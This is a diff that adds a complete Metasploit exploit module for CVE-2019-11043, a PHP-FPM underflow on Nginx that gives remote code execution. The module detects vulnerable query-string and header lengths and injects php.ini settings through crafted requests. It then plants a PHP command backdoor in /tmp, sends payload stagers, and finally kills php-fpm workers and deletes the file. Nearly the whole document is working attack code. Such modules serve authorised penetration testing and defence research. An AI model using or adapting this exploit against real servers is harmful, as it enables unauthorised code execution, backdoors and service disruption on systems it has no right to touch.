@@ -1,0 +1,436 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => 'PHP-FPM Underflow RCE',
+        'Description'    => %q(
+          This module exploits an underflow vulnerability in versions 7.1.x
+          below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 of PHP-FPM on
+          Nginx. Only servers with certains Nginx + PHP-FPM configurations are
+          exploitable. This is a port of the original neex's exploit code (see
+          refs.). First, it detects the correct parameters (Query String Length
+          and custom header length) needed to trigger code execution. This step
+          determines if the target is actually vulnerable (Check method). Then,
+          the exploit sets a series of PHP INI directives to create a file
+          locally on the target, which enables code execution through a query
+          string parameter. This is used to execute normal payload stagers.
+          Finally, this module does some cleanup by killing local PHP-FPM
+          workers (those are spawned automatically once killed) and removing
+          the created local file.
+        ),
+        'Author'         => [
+          'neex',          # (Emil Lerner) Discovery and original exploit code
+          'cdelafuente-r7' # This module
+        ],
+        'References'     =>
+          [
+            ['CVE', '2019-11043'],
+            ['EDB', '47553'],
+            ['URL', 'https://github.com/neex/phuip-fpizdam'],
+            ['URL', 'https://bugs.php.net/bug.php?id=78599'],
+            ['URL', 'https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html']
+          ],
+        'DisclosureDate' => "2019-10-22",
+        'License'        => MSF_LICENSE,
+        'Payload'        => {
+          'BadChars' => "&>\' "
+        },
+        'Targets'        => [
+          [
+            'PHP', {
+              'Platform' => 'php',
+              'Arch'     => ARCH_PHP,
+              'Payload'  => {
+                'PrependEncoder' => "php -r \"",
+                'AppendEncoder'  => "\""
+              }
+            }
+          ],
+          [
+            'Shell Command', {
+              'Platform' => 'unix',
+              'Arch'     => ARCH_CMD
+            }
+          ]
+        ],
+        'DefaultTarget' => 0,
+        'Notes'         => {
+          'Stability'   => [CRASH_SERVICE_RESTARTS],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
+        }
+      )
+    )
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'Path to a PHP page', '/index.php'])
+    ])
+
+    register_advanced_options([
+      OptInt.new('MinQSL', [true, 'Minimum query string length', 1500]),
+      OptInt.new('MaxQSL', [true, 'Maximum query string length', 1950]),
+      OptInt.new('QSLHint', [false, 'Query string length hint']),
+      OptInt.new('QSLDetectStep', [true, 'Query string length detect step', 5]),
+      OptInt.new('MaxQSLCandidates', [true, 'Max query string length candidates', 10]),
+      OptInt.new('MaxQSLDetectDelta', [true, 'Max query string length detection delta', 10]),
+      OptInt.new('MaxCustomHeaderLength', [true, 'Max custom header length', 256]),
+      OptInt.new('CustomHeaderLengthHint', [false, 'Custom header length hint']),
+      OptEnum.new('DetectMethod', [true, "Detection method", 'session.auto_start', self.class.detect_methods.keys]),
+      OptInt.new('OperationMaxRetries', [true, 'Maximum of operation retries', 20])
+    ])
+    @filename = rand_text_alpha(1)
+    @http_param = rand_text_alpha(1)
+  end
+
+  CHECK_COMMAND   = "which which"
+  SUCCESS_PATTERN = "/bin/which"
+
+  class DetectMethod
+    attr_reader :php_option_enable, :php_option_disable
+
+    def initialize(php_option_enable:, php_option_disable:, check_cb:)
+      @php_option_enable = php_option_enable
+      @php_option_disable = php_option_disable
+      @check_cb = check_cb
+    end
+
+    def php_option_enabled?(res)
+      !!@check_cb.call(res)
+    end
+  end
+
+  def self.detect_methods
+    {
+      'session.auto_start' => DetectMethod.new(
+        php_option_enable: 'session.auto_start=1',
+        php_option_disable: 'session.auto_start=0',
+        check_cb: ->(res) { res.get_cookies =~ /PHPSESSID=/ }
+      ),
+      'output_handler.md5' => DetectMethod.new(
+        php_option_enable:  'output_handler=md5',
+        php_option_disable: 'output_handler=NULL',
+        check_cb: ->(res) { res.body.length == 16 }
+      )
+    }
+  end
+
+  def send_crafted_request(path:, qsl: datastore['MinQSL'], customh_length: 1, cmd: '', allow_retry: true)
+    uri = URI.encode(normalize_uri(target_uri.path, path)).gsub(/([?&])/, {'?'=>'%3F', '&'=>'%26'})
+    qsl_delta = uri.length - path.length - URI.encode(target_uri.path).length
+    if qsl_delta.odd?
+      fail_with Failure::Unknown, "Got odd qslDelta, that means the URL encoding gone wrong: path=#{path}, qsl_delta=#{qsl_delta}"
+    end
+    prefix = cmd.empty? ? '' : "#{@http_param}=#{URI.encode(cmd)}%26"
+    qsl_prime = qsl - qsl_delta/2 - prefix.length
+    if qsl_prime < 0
+      fail_with Failure::Unknown, "QSL value too small to fit the command: QSL=#{qsl}, qsl_delta=#{qsl_delta}, prefix (size=#{prefix.size})=#{prefix}"
+    end
+    uri = "#{uri}?#{prefix}#{'Q'*qsl_prime}"
+    opts = {
+      'method'  => 'GET',
+      'uri'     => uri,
+      'headers' => {
+        'CustomH' => "x=#{Rex::Text.rand_text_alphanumeric(customh_length)}",
+        'Nuut'    => Rex::Text.rand_text_alphanumeric(11)
+      }
+    }
+    actual_timeout = datastore['HttpClientTimeout'] if datastore['HttpClientTimeout']&.> 0
+    actual_timeout ||= 20
+
+    connect(opts) if client.nil? || !client.conn?
+    # By default, try to reuse an existing connection (persist option).
+    res = client.send_recv(client.request_raw(opts), actual_timeout, true)
+    if res.nil? && allow_retry
+      # The server closed the connection, resend without 'persist', which forces
+      # reconnecting. This could happen if the connection is reused too much time.
+      # Nginx will automatically close a keepalive connection after 100 requests
+      # by default or whatever value is set by the 'keepalive_requests' option.
+      res = client.send_recv(client.request_raw(opts), actual_timeout)
+    end
+    res
+  end
+
+  def repeat_operation(op, opts={})
+    datastore['OperationMaxRetries'].times do |i|
+      vprint_status("#{op}: try ##{i+1}")
+      res = opts.empty? ? send(op) : send(op, opts)
+      return res if res
+    end
+    nil
+  end
+
+  def extend_qsl_list(qsl_candidates)
+    qsl_candidates.each_with_object([]) do |qsl, extended_qsl|
+      (0..datastore['MaxQSLDetectDelta']).step(datastore['QSLDetectStep']) do |delta|
+        extended_qsl << qsl - delta
+      end
+    end.sort.uniq
+  end
+
+  def sanity_check?
+    datastore['OperationMaxRetries'].times do
+      res = send_crafted_request(
+        path: "/PHP\nSOSAT",
+        qsl: datastore['MaxQSL'],
+        customh_length: datastore['MaxCustomHeaderLength']
+      )
+      unless res
+        vprint_error("Error during sanity check")
+        return false
+      end
+      if res.code != @base_status
+        vprint_error(
+          "Invalid status code: #{res.code} (must be #{@base_status}). "\
+          "Maybe \".php\" suffix is required?"
+        )
+        return false
+      end
+      detect_method = self.class.detect_methods[datastore['DetectMethod']]
+      if detect_method.php_option_enabled?(res)
+        vprint_error(
+          "Detection method '#{datastore['DetectMethod']}' won't work since "\
+          "the PHP option has already been set on the target. Try another one"
+        )
+        return false
+      end
+    end
+    return true
+  end
+
+  def set_php_setting(php_setting:, qsl:, customh_length:, cmd: '')
+    res = nil
+    path = "/PHP_VALUE\n#{php_setting}"
+    pos_offset = 34
+    if path.length > pos_offset
+      vprint_error(
+        "The path size (#{path.length} bytes) is larger than the allowed size "\
+        "(#{pos_offset} bytes). Choose a shorter php.ini value (current: '#{php_setting}')")
+      return nil
+    end
+    path += ';' * (pos_offset - path.length)
+    res = send_crafted_request(
+      path: path,
+      qsl: qsl,
+      customh_length: customh_length,
+      cmd: cmd
+    )
+    unless res
+      vprint_error("error while setting #{php_setting} for qsl=#{qsl}, customh_length=#{customh_length}")
+    end
+    return res
+  end
+
+  def send_params_detection(qsl_candidates:, customh_length:, detect_method:)
+    php_setting = detect_method.php_option_enable
+    vprint_status("Iterating until the PHP option is enabled (#{php_setting})...")
+    customh_lengths = customh_length ? [customh_length] : (1..datastore['MaxCustomHeaderLength']).to_a
+    qsl_candidates.product(customh_lengths) do |qsl, c_length|
+      res = set_php_setting(php_setting: php_setting, qsl: qsl, customh_length: c_length)
+      unless res
+        vprint_error("Error for qsl=#{qsl}, customh_length=#{c_length}")
+        return nil
+      end
+      if res.code != @base_status
+        vprint_status("Status code #{res.code} for qsl=#{qsl}, customh_length=#{c_length}")
+      end
+      if detect_method.php_option_enabled?(res)
+        php_setting = detect_method.php_option_disable
+        vprint_status("Attack params found, disabling PHP option (#{php_setting})...")
+        set_php_setting(php_setting: php_setting, qsl: qsl, customh_length: c_length)
+        return { qsl: qsl, customh_length: c_length }
+      end
+    end
+    return nil
+  end
+
+  def detect_params(qsl_candidates)
+    customh_length = nil
+    if datastore['CustomHeaderLengthHint']
+      vprint_status(
+        "Using custom header length hint for max length (customh_length="\
+        "#{datastore['CustomHeaderLengthHint']})"
+      )
+      customh_length = datastore['CustomHeaderLengthHint']
+    end
+    detect_method = self.class.detect_methods[datastore['DetectMethod']]
+    return repeat_operation(
+      :send_params_detection,
+      qsl_candidates: qsl_candidates,
+      customh_length: customh_length,
+      detect_method: detect_method
+    )
+  end
+
+  def send_attack_chain
+    [
+      "short_open_tag=1",
+      "html_errors=0",
+      "include_path=/tmp",
+      "auto_prepend_file=#{@filename}",
+      "log_errors=1",
+      "error_reporting=2",
+      "error_log=/tmp/#{@filename}",
+      "extension_dir=\"<?=`\"",
+      "extension=\"$_GET[#{@http_param}]`?>\""
+    ].each do |php_setting|
+      vprint_status("Sending php.ini setting: #{php_setting}")
+      res = set_php_setting(
+        php_setting: php_setting,
+        qsl: @params[:qsl],
+        customh_length: @params[:customh_length],
+        cmd: "/bin/sh -c '#{CHECK_COMMAND}'"
+      )
+      if res
+        return res if res.body.include?(SUCCESS_PATTERN)
+      else
+        print_error("Error when setting #{php_setting}")
+        return nil
+      end
+    end
+    return nil
+  end
+
+  def send_payload
+    disconnect(client) if client&.conn?
+    send_crafted_request(
+      path: '/',
+      qsl: @params[:qsl],
+      customh_length: @params[:customh_length],
+      cmd: payload.encoded,
+      allow_retry: false
+    )
+    Rex.sleep(1)
+    return session_created? ? true : nil
+  end
+
+  def send_backdoor_cleanup
+    cleanup_command = ";echo '<?php echo `$_GET[#{@http_param}]`;return;?>'>/tmp/#{@filename}"
+    res = send_crafted_request(
+      path: '/',
+      qsl: @params[:qsl],
+      customh_length: @params[:customh_length],
+      cmd: cleanup_command + ';' + CHECK_COMMAND
+    )
+    return res if res&.body.include?(SUCCESS_PATTERN)
+    return nil
+  end
+
+  def detect_qsl
+    qsl_candidates = []
+    (datastore['MinQSL']..datastore['MaxQSL']).step(datastore['QSLDetectStep']) do |qsl|
+      res = send_crafted_request(path: "/PHP\nabcdefghijklmopqrstuv.php", qsl: qsl)
+      unless res
+        vprint_error("Error when sending query with QSL=#{qsl}")
+        next
+      end
+      if res.code != @base_status
+        vprint_status("Status code #{res.code} for qsl=#{qsl}, adding as a candidate")
+        qsl_candidates << qsl
+      end
+    end
+    qsl_candidates
+  end
+
+  def check
+    print_status("Sending baseline query...")
+    res = send_crafted_request(path: "/path\ninfo.php")
+    return CheckCode::Unknown("Error when sending baseline query") unless res
+    @base_status = res.code
+    vprint_status("Base status code is #{@base_status}")
+
+    if datastore['QSLHint']
+      print_status("Skipping qsl detection, using hint (qsl=#{datastore['QSLHint']})")
+      qsl_candidates = [datastore['QSLHint']]
+    else
+      print_status("Detecting QSL...")
+      qsl_candidates = detect_qsl
+    end
+    if qsl_candidates.empty?
+      return CheckCode::Detected("No qsl candidates found, not vulnerable or something went wrong")
+    end
+    if qsl_candidates.size > datastore['MaxQSLCandidates']
+      return CheckCode::Detected("Too many qsl candidates found, looks like I got banned")
+    end
+
+    print_good("The target is probably vulnerable. Possible QSLs: #{qsl_candidates}")
+
+    qsl_candidates = extend_qsl_list(qsl_candidates)
+    vprint_status("Extended QSL list: #{qsl_candidates}")
+
+    print_status("Doing sanity check...")
+    return CheckCode::Detected('Sanity check failed') unless sanity_check?
+
+    print_status("Detecting attack parameters...")
+    @params = detect_params(qsl_candidates)
+    return CheckCode::Detected('Unable to detect parameters') unless @params
+
+    print_good("Parameters found: QSL=#{@params[:qsl]}, customh_length=#{@params[:customh_length]}")
+    print_good("Target is vulnerable!")
+    CheckCode::Vulnerable
+  ensure
+    disconnect(client) if client&.conn?
+  end
+
+  def exploit
+    unless check == CheckCode::Vulnerable
+      fail_with Failure::NotVulnerable, 'Target is not vulnerable.'
+    end
+    if @params[:qsl].nil? || @params[:customh_length].nil?
+      fail_with Failure::NotVulnerable, 'Attack parameters not found'
+    end
+
+    print_status("Performing attack using php.ini settings...")
+    if repeat_operation(:send_attack_chain)
+      print_good("Success! Was able to execute a command by appending '#{CHECK_COMMAND}'")
+    else
+      fail_with Failure::Unknown, 'Failed to send the attack chain'
+    end
+
+    print_status("Trying to cleanup /tmp/#{@filename}...")
+    if repeat_operation(:send_backdoor_cleanup)
+      print_good('Cleanup done!')
+    end
+
+    print_status("Sending payload...")
+    repeat_operation(:send_payload)
+  end
+
+  def send_cleanup(cleanup_cmd:)
+    res = send_crafted_request(
+      path: '/',
+      qsl: @params[:qsl],
+      customh_length: @params[:customh_length],
+      cmd: cleanup_cmd
+    )
+    return res if res && res.code != @base_status
+    return nil
+  end
+
+  def cleanup
+    return unless successful
+    kill_workers = 'for p in `pidof php-fpm`; do kill -9 $p;done'
+    rm = "rm -f /tmp/#{@filename}"
+    cleanup_cmd = kill_workers + ';' + rm
+    disconnect(client) if client&.conn?
+    print_status("Remove /tmp/#{@filename} and kill workers...")
+    if repeat_operation(:send_cleanup, cleanup_cmd: cleanup_cmd)
+      print_good("Done!")
+    else
+      print_bad(
+        "Could not cleanup. Run these commands before terminating the session: "\
+        "#{kill_workers}; #{rm}"
+      )
+    end
+  end
+end
